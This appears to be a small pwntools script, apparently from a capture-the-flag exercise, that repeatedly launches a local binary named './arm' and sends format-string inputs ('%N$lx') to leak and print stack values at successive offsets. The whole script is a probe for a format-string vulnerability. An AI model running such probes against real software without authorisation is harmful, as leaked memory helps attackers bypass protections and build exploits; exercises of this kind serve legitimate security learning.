from pwn import *
#context_level='DEBUG'

e = ELF("./arm")
for i in range(20):
	io = e.process(level="error")
	io.sendline("%%%d$lx" % i)
	io.recvline()
	print("%d - %s" % (i, io.recvline().strip()))
	io.close()
